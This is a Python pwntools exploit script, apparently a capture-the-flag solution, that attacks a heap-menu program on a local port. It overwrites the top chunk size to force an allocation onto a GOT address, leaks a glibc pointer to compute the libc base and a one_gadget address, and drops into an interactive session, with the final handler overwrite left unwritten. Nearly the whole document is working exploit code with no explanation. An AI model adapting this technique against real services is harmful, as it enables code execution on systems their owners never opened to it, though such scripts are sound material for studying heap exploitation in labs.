from pwn import *

context.arch='amd64'

host = '127.0.0.1'
port = 8888
r = remote(host, port)

def allocate_heap(size, data, sendline=True):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    if sendline:
        r.sendline(data)
    else:
        r.send(data)

def show_heap():
    r.recvuntil(':')
    r.sendline(b'2')

# overwrite chunk size
allocate_heap(0x30, b'a')
allocate_heap(0x30, b'a')
allocate_heap(0x38, b'c'*0x38 + p64(0xffffffffffffffff))
r.recvuntil(':')

glibc_stdin_got = 0x602030
glibc_stdin_off = 0x3c4861
stderr_off = 0x3c5561
one_gadget_off = 0x45216

# leak libc
top_chunk_addr = int(input('top_chunk_addr: '), 16)
allocate_heap(glibc_stdin_got - top_chunk_addr - 0x10 - 0x10, b'a')
input('Check the real glibc_stdin')
allocate_heap(0x10, b'a', False)
sleep(1)
show_heap()
glibc_stdin = u64(r.recvuntil('\n')[1:-1].ljust(8, b'\x00'))
glibc_stdin = (glibc_stdin & 0xffffffffffffff00) + 0xe0
print('glibc_stdin', hex(glibc_stdin))
libc = glibc_stdin - glibc_stdin_off
one_gadget = libc + one_gadget_off
print('one_gadget', hex(one_gadget))

# overwrite handler
handler = 0x400866

r.interactive()
